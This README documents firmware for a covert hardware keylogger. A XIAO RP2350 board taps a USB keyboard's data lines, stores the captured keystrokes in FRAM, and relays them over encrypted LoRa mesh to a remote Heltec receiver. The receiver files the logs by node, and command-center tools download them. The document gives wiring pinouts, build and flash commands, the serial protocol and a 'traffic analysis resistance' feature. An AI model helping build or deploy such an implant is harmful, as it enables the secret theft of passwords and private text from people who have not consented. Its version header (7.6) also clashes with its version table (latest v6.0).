# USB Capture Module - Platform Implementation (RP2350)

**Version:** 7.6 - Randomized TX Interval (Traffic Analysis Resistance)
**Platform:** XIAO RP2350-SX1262 (Sender) + Heltec V4 (Receiver)
**Last Updated:** 2025-12-14

Captures USB keyboard keystrokes using PIO hardware on RP2350, stores them in FRAM, and transmits reliably to Heltec V4 base station over LoRa mesh with ACK-based delivery.

---

## Quick Start

```bash
# Build XIAO sender
pio run -e xiao-rp2350-sx1262

# Build Heltec V4 receiver
pio run -e heltec-v4

# Flash XIAO (copy UF2 to device in BOOTSEL mode)
cp .pio/build/xiao-rp2350-sx1262/firmware.uf2 /Volumes/RPI-RP2/

# Flash Heltec V4
pio run -e heltec-v4 --target upload
```

---

## System Architecture

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         STE USB CAPTURE SYSTEM                              │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  XIAO RP2350 (Sender)              Heltec V4 (Receiver)                    │
│  ┌──────────────────┐              ┌───────────────────┐                   │
│  │ USB Keyboard     │              │ KeylogReceiverMod │                   │
│  │       ↓          │              │                   │                   │
│  │ PIO Capture      │              │ /keylogs/         │                   │
│  │       ↓          │── PKI DM ──> │   <node_id>/      │                   │
│  │ FRAM Storage     │              │     keylog_*.txt  │                   │
│  │       ↓          │<── ACK ───── │                   │                   │
│  │ USBCaptureModule │              │ Serial Commands   │                   │
│  └──────────────────┘              └─────────┬─────────┘                   │
│                                              │                              │
│                                    ┌─────────▼─────────┐                   │
│                                    │ STE Command Center│                   │
│                                    │ (JS or Python)    │                   │
│                                    └───────────────────┘                   │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Dual-Core Design (XIAO)

```
Core1 (Producer - USB Capture):
  USB Keyboard → GPIO → PIO State Machines
    → Packet Handler → HID Decoder → Buffer Manager → FRAM

Core0 (Consumer - Meshtastic):
  FRAM → Read Batch → Decode Text → LoRa Transmit → Wait ACK → Delete Batch
```

---

## Components

### 1. XIAO RP2350 - USB Capture Device

| Component | Description |
|-----------|-------------|
| `USBCaptureModule.cpp/h` | Core0 module - transmission + ACK handling |
| `FRAMBatchStorage.cpp/h` | 256KB non-volatile storage manager |
| `usb_capture/` | Core1 PIO-based USB capture |

### 2. Heltec V4 - Base Station Receiver

| Component | Description |
|-----------|-------------|
| `KeylogReceiverModule.cpp/h` | Receives batches, stores to flash, sends ACKs |
| Storage Path | `/keylogs/<node_id_hex>/keylog_YYYY-MM-DD.txt` |

### 3. Command Center Tools

| Tool | Path | Description |
|------|------|-------------|
| **JavaScript** | `tools/ste_command_center.js` | Terminal UI with blessed |
| **Python** | `tools/ste_command_center/` | Textual-based TUI |

---

## Command Center Usage

### JavaScript (Recommended)

```bash
cd tools
npm install blessed serialport
node ste_command_center.js
```

**Features:**
- Device auto-detection with VID/PID identification
- Color-coded device types (Heltec V4 = yellow, XIAO = cyan)
- Direct serial communication (no mesh overhead)
- View, download, and delete keylog files

### Python

```bash
cd tools/ste_command_center
pip install -r requirements.txt
python ste_command_center.py
```

---

## Serial Protocol (Computer ↔ Heltec V4)

Commands are sent directly via serial (115200 baud) without mesh transmission.

### Commands

| Command | Description |
|---------|-------------|
| `LOGS:LIST` | List all keylog files |
| `LOGS:READ:<node>:<file>` | Read file contents (base64 encoded) |
| `LOGS:DELETE:<node>:<file>` | Delete a file |
| `LOGS:STATS` | Get storage statistics |
| `LOGS:ERASE_ALL` | Delete all keylogs |

### Response Format

Responses are wrapped in markers for reliable parsing:

```
<<JSON>>{"status":"ok","command":"list","files":[...]}<</JSON>>
```

### Example Session

```
> LOGS:STATS
<<JSON>>{"status":"ok","command":"stats","nodes":2,"files":5,"bytes":12450,"rx":127,"stored":125,"acks":125,"errors":0}<</JSON>>

> LOGS:LIST
<<JSON>>{"status":"ok","command":"list","count":5,"files":[{"node":"a1b2c3d4","name":"keylog_2025-12-14.txt","size":2048}]}<</JSON>>

> LOGS:READ:a1b2c3d4:keylog_2025-12-14.txt
<<JSON>>{"status":"ok","command":"read","node":"a1b2c3d4","file":"keylog_2025-12-14.txt","size":2048,"data":"<base64>"}<</JSON>>
```

---

## Hardware Setup

### USB Keyboard Connection (XIAO)

**CRITICAL:** GPIO pins MUST be consecutive for PIO hardware requirements.

```
USB Keyboard          XIAO RP2350
------------          -----------
D+ (Green)    ────►   GPIO 16
D- (White)    ────►   GPIO 17
GND (Black)   ────►   GND
VBUS (Red)    ────►   5V (optional)
```

### FRAM Connection (XIAO - SPI0 Shared with LoRa)

```
Adafruit FRAM         XIAO RP2350
(MB85RS2MTA)          -----------
CS            ────►   GPIO 1 (D6)
SCK           ────►   GPIO 2 (D8)  [shared]
MISO          ────►   GPIO 4 (D9)  [shared]
MOSI          ────►   GPIO 3 (D10) [shared]
VCC           ────►   3V3
GND           ────►   GND
```

---

## Transmission Protocol (XIAO → Heltec)

### Mesh Protocol

| Field | Description |
|-------|-------------|
| Port | `PRIVATE_APP` (256) |
| Encryption | PKI (X25519 key exchange) |
| Payload | `[batch_id:4][decoded_text:N]` |
| ACK Format | `ACK:0x<8-hex-digits>` |

### Reliable Delivery

1. XIAO sends batch with unique `batch_id`
2. Heltec stores to flash, sends ACK
3. XIAO receives ACK, deletes batch from FRAM
4. On timeout: Exponential backoff (30s → 60s → 120s), then retry

---

## Storage Hierarchy

| Priority | Storage | Device | Capacity | Persistence |
|----------|---------|--------|----------|-------------|
| Primary | FRAM (MB85RS2MTA) | XIAO | 256KB (~500 batches) | Non-volatile |
| Fallback | PSRAM Buffer | XIAO | 4KB (8 slots) | Volatile |
| Final | LittleFS Flash | Heltec | ~1MB | Non-volatile |

---

## Multi-Core Safety Rules (XIAO)

### FORBIDDEN in Core1

| Rule | Reason |
|------|--------|
| NO `LOG_INFO`, `printf`, etc. | Logging not thread-safe - causes crashes |
| NO shared mutable state | Without `volatile` - memory visibility issues |
| NO tight loops without `tight_loop_contents()` | Causes bus contention |
| NO code executing from flash | Core0 flash writes freeze Core1 |

### REQUIRED Practices

| Rule | Implementation |
|------|----------------|
| RAM execution | Mark all Core1 functions with `CORE1_RAM_FUNC` |
| Memory barriers | Add `__dmb()` for cross-core synchronization |
| Lock-free algorithms | Use volatile flags, not mutexes |
| Bus arbitration | Call `tight_loop_contents()` in Core1 loops |

---

## File Structure

```
src/
├── modules/
│   ├── USBCaptureModule.cpp/h       # XIAO: Core0 module
│   └── KeylogReceiverModule.cpp/h   # Heltec: Receiver module
├── FRAMBatchStorage.cpp/h           # FRAM storage manager
└── platform/rp2xx0/usb_capture/
    ├── common.h                     # CORE1_RAM_FUNC macro
    ├── pio_manager.c/h              # PIO configuration
    ├── usb_capture.pio              # PIO assembly
    ├── usb_packet_handler.cpp/h     # USB packet processing
    ├── keyboard_decoder_core1.cpp/h # HID decoder
    ├── usb_capture_main.cpp/h       # Core1 main loop
    ├── psram_buffer.cpp/h           # Ring buffer (fallback)
    └── README.md                    # This file

tools/
├── ste_command_center.js            # JavaScript TUI
└── ste_command_center/              # Python TUI
    ├── ste_command_center.py
    └── src/
        ├── services/meshtastic_client.py
        └── models/keylog_file.py
```

---

## Troubleshooting

### No Keystrokes Captured (XIAO)

1. Check GPIO wiring: D+ → GPIO 16, D- → GPIO 17
2. Try different USB speed: LOW ↔ FULL
3. Check Core1 status codes in logs (0xC1-0xC4)

### FRAM Not Detected (XIAO)

```
[USBCapture] FRAM: Init failed, using RAM buffer fallback
```

Check SPI wiring, power (3.3V), device ID (Mfr=0x04, Prod=0x4803)

### Command Center Connection Failed

1. Select correct device (Heltec V4 = yellow, VID `303a`)
2. Check serial port permissions
3. Verify KeylogReceiverModule is enabled in firmware

### PKI Encryption Fails

```
PKC decrypt failed
```

1. Reset flash on both devices: `meshtastic --factory-reset-device`
2. Let devices rediscover each other (exchange public keys)
3. Wait for NodeInfo broadcast (~5 minutes)

### LOGS:READ Times Out / Device Crashes

Fixed in v6.0 with static buffers. Ensure firmware is updated.

---

## Performance

| Metric | XIAO | Heltec |
|--------|------|--------|
| Flash Usage | 58.3% | 31.1% |
| RAM Usage | 24.7% | 5.2% |
| Core0 CPU | ~0.2% | N/A |
| Core1 CPU | 15-25% | N/A |
| Max Keystroke Rate | ~100/sec | N/A |
| ACK Response Time | N/A | <500ms |

---

## Version History

| Version | Date | Changes |
|---------|------|---------|
| **v6.0** | 2025-12-14 | ACK-based reliable transmission, KeylogReceiverModule, Command Center tools |
| v5.0 | 2025-12-13 | FRAM non-volatile storage (256KB) |
| v4.0 | 2025-12-07 | RTC timestamps with mesh sync |
| v3.2 | 2025-12-07 | Multi-core flash fix (RAM execution) |
| v3.0 | 2025-12-06 | PSRAM ring buffer, 90% Core0 reduction |

---

## Related Documentation

- **Project Context:** `CLAUDE.md`
- **FRAM API:** `src/FRAMBatchStorage.h`
- **Buffer Design:** `modules/PSRAM_BUFFER_ARCHITECTURE.md`
- **KeylogReceiver:** `src/modules/KeylogReceiverModule.h`

---

## License

- USB capture core: BSD-3-Clause
- Meshtastic modules: GPL-3.0-only
